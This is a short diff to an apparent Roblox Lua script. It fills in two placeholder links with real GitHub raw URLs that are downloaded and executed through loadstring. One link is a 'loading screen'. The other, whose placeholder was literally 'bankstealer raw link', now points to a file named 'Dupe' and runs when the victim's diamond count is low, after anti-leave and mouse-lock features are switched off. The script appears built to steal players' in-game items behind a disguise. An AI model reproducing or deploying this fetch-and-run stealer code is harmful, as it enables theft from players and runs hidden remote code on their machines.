@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakatoSey/rbx/main/lsd'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
@@ -751,7 +751,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/TakatoSey/rbxx/main/Dupe", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
